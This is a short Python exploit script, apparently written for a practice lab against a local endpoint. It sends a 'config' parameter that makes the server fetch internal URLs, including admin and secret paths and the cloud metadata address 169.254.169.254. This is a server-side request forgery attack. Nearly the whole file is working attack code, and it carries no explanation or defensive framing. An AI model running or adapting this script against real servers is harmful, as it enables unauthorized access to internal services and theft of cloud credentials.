import requests

# Configuration
base_url = "http://127.0.0.1:42001/"
vuln_url = base_url + "misconfigured-endpoint"
misconfigured_url = "http://127.0.0.1:80/admin"  # Misconfigured service we want to access

# Headers
headers = {
    'Cookie': 'PHPSESSID=rkg47evun26n2jg6vjhrg3vlk8; security=low',
}

def exploit_misconfiguration(target_url):
    params = {
        'config': target_url  # The parameter name might be different depending on the application
    }
    response = requests.get(vuln_url, params=params, headers=headers)
    print("Response from misconfiguration exploit:")
    print(response.text)

def main():
    print(f"Exploiting Security Misconfiguration vulnerability to access misconfigured URL: {misconfigured_url}")
    exploit_misconfiguration(misconfigured_url)

    # You can add more misconfigured URLs to test
    misconfigured_urls = [
        "http://127.0.0.1:80/",
        "http://127.0.0.1:80/admin",
        "http://127.0.0.1:80/secret",
        "http://169.254.169.254/latest/meta-data/"
    ]

    for url in misconfigured_urls:
        print(f"Testing misconfigured URL: {url}")
        exploit_misconfiguration(url)

if __name__ == "__main__":
    main()
